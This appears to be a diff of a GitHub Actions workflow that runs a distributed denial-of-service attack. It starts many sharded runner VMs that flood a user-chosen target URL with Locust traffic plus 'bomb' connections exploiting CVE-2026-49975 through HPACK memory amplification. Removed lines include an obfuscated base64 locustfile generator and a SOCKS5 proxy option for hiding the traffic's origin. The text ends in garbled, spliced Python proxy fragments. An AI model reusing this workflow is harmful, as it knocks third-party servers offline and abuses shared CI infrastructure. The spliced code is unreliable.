@@ -1,38 +1,42 @@
-name: CVE-2026-49975 Test
+name: Dynamic Sharded Server Load Test + CVE-2026-49975
 
 on:
   workflow_dispatch:
     inputs:
+      # ===== 原有参数 =====
       target_url:
-        description: 'Target URL'
+        description: '1. 目标 URL (例如: https://api.yourdomain.com)'
         required: true
         default: 'https://example.com'
       threads_per_shard:
-        description: 'Threads per shard'
+        description: '2. 每个分片的用户数'
         required: true
         default: '100'
       shard_count:
-        description: 'Shard count'
+        description: '3. 分片数量 (启动对应数量的虚拟机)'
         required: true
         default: '15'
       run_time_minutes:
-        description: 'Run time (minutes)'
+        description: '4. 测试时长 (单位: 分钟)'
         required: true
         default: '5'
+
+      # ===== 新增：CVE-2026-49975 漏洞测试参数 =====
+      bomb_ratio:
+        description: '5. 炸弹用户比例 (0.0~1.0，例如 0.3 = 30% 炸弹)'
+        required: false
+        default: '0.3'
       hpack_references:
-        description: 'HPACK references'
+        description: '6. HPACK 索引引用次数 (越大内存放大越狠，建议 1024~4096)'
         required: false
         default: '2048'
       hold_seconds:
-        description: 'Hold seconds'
+        description: '7. 炸弹连接保持秒数 (建议 10~30 秒)'
         required: false
         default: '15'
-      proxy_url:
-        description: 'Proxy URL (empty for direct)'
-        required: false
-        default: ''
 
 jobs:
+  # 任务一：根据 shard_count 动态生成矩阵数组
   generate-matrix:
     runs-on: ubuntu-latest
     outputs:
@@ -44,7 +48,8 @@ jobs:
           JSON_ARRAY=$(python3 -c "import json; print(json.dumps(list(range(1, $SHARD_COUNT + 1))))")
           echo "matrix_array=$JSON_ARRAY" >> $GITHUB_OUTPUT
 
-  bomb-attack:
+  # 任务二：分布式轰炸 + 漏洞复现
+  flood-attack:
     needs: generate-matrix
     runs-on: ubuntu-latest
     strategy:
@@ -53,7 +58,7 @@ jobs:
         shard: ${{ fromJson(needs.generate-matrix.outputs.matrix_array) }}
 
     steps:
-      - name: Checkout
+      - name: Checkout Repository
         uses: actions/checkout@v4
 
       - name: Set up Python
@@ -61,17 +66,10 @@ jobs:
         with:
           python-version: '3.10'
 
-      - name: Install
-        run: pip install locust==2.32.2 PySocks
+      - name: Install Locust
+        run: pip install locust==2.32.2
 
-      - name: Generate locustfile
-        run: |
-          echo "aW1wb3J0IG9zCmltcG9ydCBzZWNyZXRzCmltcG9ydCBiYXNlNjQKCmNvZGUgPSBiYXNlNjQuZGVjb2RlKG1lbnUuZ2V0KCdMT0NVU1RfRklMRScpKS5kZWNvZGUoJ3V0Zi04JykKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHdpdGggb3BlbigneC5weScsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKGNvZGUpCiAgICAgICAgZi5mbHVzaCgpCg==" | base64 -d > gen.py
-          python3 gen.py
-          rm gen.py
-          head -3 locustfile.py
-
-      - name: Run
+      - name: 🚀 Fire Requests + CVE-2026-49975 Bomb - Shard ${{ matrix.shard }}
         run: |
           locust -f locustfile.py \
             --headless \
@@ -80,24 +78,16 @@ jobs:
             --run-time ${{ github.event.inputs.run_time_minutes }}m \
             --host ${{ github.event.inputs.target_url }}
         env:
-          LOCUST_FILE: ${{ vars.LOCUST_FILE }}
+          # 通过环境变量传递给 locustfile.py
+          LOCUST_TRADITIONAL_RATIO: ${{ github.event.inputs.bomb_ratio == '0' && '1.0' || format('{0}', 1 - github.event.inputs.bomb_ratio | float) }}
+          LOCUST_BOMB_RATIO: ${{ github.event.inputs.bomb_ratio }}
           LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
           LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
-          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
 
-      - name: Done
-        run: echo "Shard ${{ matrix.shard }} done"  else:
-        return None, None, None
-    if \"@\" in rest: rest = rest.split(\"@\")[-1]
-    if \":\" in rest:
-        h, ps = rest.split(\":\", 1)
-        return pt, h, int(ps.split(\"/\")[0])
-    return pt, rest, 1080
-
-def conn(addr, timeout=None, pp=None):
-    pt, ph, pp2 = pp or (None, None, None)
-    if pt and HAS_SOCKS:
-        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+      - name: 📊 Shard ${{ matrix.shard }} 完成
+        run: |
+          echo "✅ Shard ${{ matrix.shard }} 测试完成"
+          echo "   传统压测 + CVE-2026-49975 漏洞复现已执行"EAM)
         un = os.environ.get(\"SOCKS5_USER\", \"\")
         pw = os.environ.get(\"SOCKS5_PASS\", \"\")
         s.set_proxy(pt, ph, pp2, un, pw)
